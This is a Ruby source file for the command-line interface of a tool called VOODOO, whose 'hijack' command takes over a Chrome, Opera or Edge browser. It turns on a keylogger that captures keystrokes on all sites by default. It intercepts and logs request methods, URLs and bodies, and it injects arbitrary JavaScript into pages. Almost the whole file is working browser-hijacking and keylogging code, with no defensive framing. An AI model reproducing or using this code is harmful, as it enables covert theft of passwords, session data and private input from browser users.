require 'thor'
require 'json'
require 'voodoo/browser'

module VOODOO

    VERSION = 'v0.0.1'

    class CLI < Thor

        desc 'version', 'Prints voodoo version'
        def version
            puts VERSION
        end

        option :js, :type => :string, :aliases => :j
        option :intercept, :type => :hash, :aliases => :i
        option :keylogger, :type => :hash, :aliases => :k
        option :browser, :type => :string, :default => 'chrome', :aliases => :b
        desc 'hijack', 'Hijack browser'
        def hijack
            case options[:browser]
                when 'chrome'
                    browser = Browser.Chrome
                when 'opera'
                    browser = Browser.Opera
                when 'edge'
                    browser = Browser.Edge
            end

            if options[:keylogger]
                matches = options[:keylogger]['matches'] || '*://*/*'
                matches = matches.split(',')
                url_include = options[:keylogger]['url_include'] || ''

                output = 'stdout'

                if options[:keylogger]['output']
                    output = open(options[:keylogger]['output'], 'a')
                end

                browser.keylogger(matches: matches, url_include: url_include) do |event|
                    if output == 'stdout'
                        puts event
                    else
                        output.puts JSON.generate(event)
                    end
                end
            end

            if options[:intercept]
                matches = options[:intercept]['matches'] || nil
                url_include = options[:intercept]['url_include'] || nil
                body_include = options[:intercept]['body_include'] || nil
                header_exists = options[:intercept]['header_exists'] || nil

                puts options

                i_output = 'stdout'

                if matches != nil
                    matches = matches.split(',')
                end

                if options[:intercept]['output']
                    i_output = open(options[:intercept]['output'], 'a')
                end

                browser.intercept(matches: matches, url_include: url_include, body_include: body_include, header_exists: header_exists) do |req|
                    if i_output == 'stdout'
                        puts "#{req['method']} #{req['url']}"
                        puts req['body'] || "<NO_BODY>"
                    else
                        i_output.puts JSON.generate(req) + "\n"
                    end
                end
            end

            if options[:js]
                browser.add_script(content: options[:js])
            end

            browser.hijack
        end

        def self.exit_on_failure?
            true
        end

    end

end